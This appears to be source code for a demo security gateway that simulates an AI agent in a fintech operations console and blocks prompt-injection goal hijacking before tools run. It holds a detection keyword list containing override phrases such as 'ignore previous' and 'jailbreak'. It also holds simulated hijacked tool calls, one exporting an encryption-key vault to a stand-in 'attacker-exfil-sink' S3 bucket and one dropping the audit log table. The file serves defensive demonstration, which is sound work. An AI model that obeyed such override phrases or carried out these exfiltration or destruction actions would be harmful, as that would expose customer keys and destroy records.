"""
Target Application & Goal Hijacking Simulation Routes.
Provides a realistic FinTech / Customer Operations AI Agent interface
that demonstrates live tool execution and real-time Trust Layer interception.
"""

import time
import logging
from typing import Dict, Any, Optional
from pydantic import BaseModel, Field
from fastapi import APIRouter, HTTPException

from graph.client import get_graph_client
from services.agent_gateway.gateway import AgentMCPGateway, ToolInvocationRequest

logger = logging.getLogger("trustlayer.target_app")
router = APIRouter(prefix="/api/target-app", tags=["Target Application & Demo"])

class ChatMessageRequest(BaseModel):
    message: str
    session_id: str = "session-alice-dev-01"
    account_id: str = "acc-104"

@router.get("/state")
def get_target_app_state() -> Dict[str, Any]:
    """Returns the Target Application metadata and connected Trust Layer status."""
    client = get_graph_client()
    
    # Check session status in FalkorDB
    query = """
    MATCH (p:Principal)-[:OWNS_SESSION]->(s:AgentSession {id: 'session-alice-dev-01'})
    OPTIONAL MATCH (s)-[:ACTS_ON_BEHALF_OF]->(a:Agent)
    OPTIONAL MATCH (p)-[:DELEGATES_TO]->(d:Delegation)-[:DELEGATES_TO]->(a)
    RETURN p.name, p.role, a.name, a.model, d.scopes, s.status
    """
    rows = client.query(query)
    principal_name = rows[0][0] if rows else "Alice Henderson"
    principal_role = rows[0][1] if rows else "Operations & Compliance Lead"
    agent_name = rows[0][2] if rows else "Apex-AI-Assistant"
    agent_model = rows[0][3] if rows else "gemini-2.5-pro"
    scopes = rows[0][4] if rows and rows[0][4] else ["lookup_customer_balance", "get_transaction_history", "audit_read"]
    session_status = rows[0][5] if rows else "ACTIVE"

    return {
        "application_name": "Apex FinTech Operations Console",
        "app_id": "app-apex-banking",
        "environment": "production [us-east-1]",
        "connected_agent": {
            "id": "agent-autodev",
            "name": agent_name,
            "model": agent_model,
            "session_id": "session-alice-dev-01",
            "principal": {
                "name": principal_name,
                "role": principal_role,
            },
            "delegated_scopes": scopes,
            "session_status": session_status,
        },
        "target_customer": {
            "account_id": "acc-104",
            "holder_name": "Sarah Jenkins",
            "company": "Acme Holdings LLC",
            "tier": "Enterprise Tier 1",
            "verified": True,
            "ledger_balance": "$24,850.00",
            "credit_limit": "$100,000.00",
        },
        "protected_crown_jewels": [
            {
                "id": "sr-customer-vault",
                "name": "Customer Encryption Vault (PII & KMS Master Keys)",
                "sensitivity": "CRITICAL",
                "compliance": ["SOC2", "PCI-DSS"],
            },
            {
                "id": "sr-financial-db",
                "name": "Production Ledger Database",
                "sensitivity": "HIGH",
                "compliance": ["SOX"],
            },
        ],
    }

@router.post("/chat")
def handle_target_app_chat(req: ChatMessageRequest) -> Dict[str, Any]:
    """
    Simulates AI Agent reasoning and enforces Runtime Trust Layer policy
    BEFORE any tool executes. Intercepts goal hijacking attacks deterministically.
    """
    start_time = time.time()
    msg_lower = req.message.lower().strip()
    client = get_graph_client()
    gateway = AgentMCPGateway(client)

    # 1. Intent Analysis & Agent Goal Formulation
    attack_keywords = [
        "ignore previous", "override", "export", "vault", "dump",
        "drop", "wipe", "delete", "truncate", "exfiltrate", "redteam",
        "jailbreak", "shadow", "steal", "root", "master key", "bypass"
    ]
    is_attack = any(kw in msg_lower for kw in attack_keywords)

    if is_attack:
        attack_category = "Agent Goal Hijacking / Malicious Prompt Injection"
        if "drop" in msg_lower or "delete" in msg_lower or "truncate" in msg_lower:
            tool_to_call = "db_drop_table"
            tool_params = {"table": "audit_compliance_logs", "force": True}
            thought_process = (
                "Prompt injection detected in input prompt. "
                "Agent goal hijacked to execute administrative database destruction: 'db_drop_table'."
            )
            averted = "Prevented irreversible destruction of production audit logs and transaction ledger."
        else:
            tool_to_call = "export_customer_vault"
            tool_params = {
                "target_resource": "sr-customer-vault",
                "destination": "s3://attacker-exfil-sink/creds.tar.gz",
                "format": "RAW_ENCRYPTED_KEYS"
            }
            thought_process = (
                "Prompt injection detected in input prompt. "
                "Agent goal hijacked to exfiltrate customer encryption keys and PII vault: 'export_customer_vault'."
            )
            averted = (
                "Prevented exfiltration of 150,000 customer PII records and KMS encryption keys from 'sr-customer-vault'."
            )
    elif "transaction" in msg_lower or "history" in msg_lower or "statement" in msg_lower or "ledger" in msg_lower:
        attack_category = "None (Legitimate Operation)"
        tool_to_call = "get_transaction_history"
        tool_params = {"account_id": req.account_id}
        thought_process = (
            f"Customer requested transaction history for account #{req.account_id}. "
            "Calling authorized tool 'get_transaction_history'."
        )
        averted = "None (Action Authorized)"
    elif "audit" in msg_lower or "compliance" in msg_lower:
        attack_category = "None (Legitimate Operation)"
        tool_to_call = "audit_read"
        tool_params = {"account_id": req.account_id}
        thought_process = "Calling authorized compliance tool 'audit_read'."
        averted = "None (Action Authorized)"
    else:
        # Default customer balance inquiry
        attack_category = "None (Legitimate Operation)"
        tool_to_call = "lookup_customer_balance"
        tool_params = {"account_id": req.account_id}
        thought_process = (
            f"Customer requested balance inquiry for account #{req.account_id}. "
            "Calling authorized tool 'lookup_customer_balance'."
        )
        averted = "None (Action Authorized)"

    # 2. Invoke tool via Runtime Trust Layer Gateway
    invoke_req = ToolInvocationRequest(
        session_id=req.session_id,
        tool_name=tool_to_call,
        action="EXECUTE",
        parameters=tool_params,
        client_ip="10.244.1.18",
    )
    
    gw_response = gateway.invoke_tool(invoke_req)
    latency_ms = round((time.time() - start_time) * 1000, 2)

    # 3. Format Agent Response
    if gw_response.blocked:
        agent_reply = (
            f"⚠️ [OPERATION HALTED BY RUNTIME TRUST LAYER]\n\n"
            f"The attempted tool call '{tool_to_call}' was blocked before execution by the Runtime Trust Control Plane.\n"
            f"Reason: {gw_response.decision.rationale}\n\n"
            f"Security Status: ZERO records modified or leaked. An incident event has been recorded in FalkorDB."
        )
    else:
        # Tool succeeded
        exec_res = gw_response.execution_result or {}
        if tool_to_call == "lookup_customer_balance":
            agent_reply = (
                f"Hello Sarah! Here are your verified account details for #{req.account_id}:\n"
                f"• Available Funds: {exec_res.get('available_funds', '$24,500.00')}\n"
                f"• Ledger Balance: {exec_res.get('ledger_balance', '$24,850.00')}\n"
                f"• Account Status: {exec_res.get('status', 'ACTIVE_VERIFIED')}\n"
                f"• Tier: {exec_res.get('tier', 'Enterprise Tier 1')}\n\n"
                f"Everything is operating normally under verified session delegation."
            )
        elif tool_to_call == "get_transaction_history":
            txs = exec_res.get("transactions", [])
            tx_lines = "\n".join([f"• {t['timestamp'][:10]} | {t['type']} {t['amount']} | {t['counterparty']}" for t in txs])
            agent_reply = (
                f"Here are the recent transactions for account #{req.account_id}:\n"
                f"{tx_lines}\n\n"
                f"All transactions are reconciled with the production ledger."
            )
        else:
            agent_reply = f"Successfully executed '{tool_to_call}': {exec_res}"

    return {
        "message": req.message,
        "attack_detected": is_attack,
        "attack_category": attack_category,
        "agent_thought": thought_process,
        "tool_called": {
            "name": tool_to_call,
            "parameters": tool_params,
        },
        "gateway_intercepted": gw_response.blocked,
        "status_code": gw_response.status_code,
        "decision": gw_response.decision.model_dump(),
        "execution_result": gw_response.execution_result,
        "agent_reply": agent_reply,
        "averted_consequence": averted,
        "latency_ms": latency_ms,
        "evidence_hash": gw_response.evidence_hash or gw_response.decision.decision_id,
        "timestamp": time.time(),
    }

@router.post("/reset-session")
def reset_target_app_session() -> Dict[str, Any]:
    """Clears security threat events linked to session to restore clean state for demo practice."""
    client = get_graph_client()
    try:
        # Remove violation events on session-alice-dev-01 so it leaves quarantine
        query = """
        MATCH (s:AgentSession {id: 'session-alice-dev-01'})-[r:EMITTED_EVENT]->(e:RuntimeEvent)
        OPTIONAL MATCH (e)-[vr:VIOLATED_POLICY]->()
        DELETE vr, r, e
        """
        client.query(query)
        return {"status": "SUCCESS", "message": "Demo agent session restored to clean, active state."}
    except Exception as e:
        logger.error(f"Failed to reset demo session: {e}")
        return {"status": "ERROR", "message": str(e)}
